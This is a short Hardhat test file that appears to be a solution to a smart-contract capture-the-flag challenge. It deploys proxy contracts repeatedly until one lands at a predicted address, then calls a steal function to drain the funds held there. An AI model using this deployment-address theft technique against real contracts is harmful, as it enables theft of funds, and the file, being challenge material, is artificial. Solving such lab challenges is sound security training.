const sendThemBack = require("../../artifacts/contracts/attacker-contracts/junior-miner.sol/SendThemBack.json")

it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    // Load up a GnosisSafeProxyFactory
    const proxyConnection = await ethers.getContractFactory("GnosisSafeProxyFactory", attacker)
    // must deploy twice (because reasons)
    await proxyConnection.deploy()
    const two = await proxyConnection.deploy()
    
    // create my 'safe' that will be deployed by the proxyfactory
    const mySafeFactory = await ethers.getContractFactory(sendThemBack.abi, sendThemBack.bytecode, attacker)
    let mySafeMasterCopy = await mySafeFactory.deploy()

    // spam safe deployments, the 65th deployment will be the correct address when issued by the
    // second proxyfactory deployed by the default attacker signer
    for (i = 0; i < 66; i++) {
        let { events } = await (await two.createProxy(mySafeMasterCopy.address, "0x")).wait()
    }

    // attach, run pwn
    const talkToMySafe = mySafeFactory.attach("0x79658d35aB5c38B6b988C23D02e0410A380B8D5c")
    await talkToMySafe.steal(attacker.address)
});
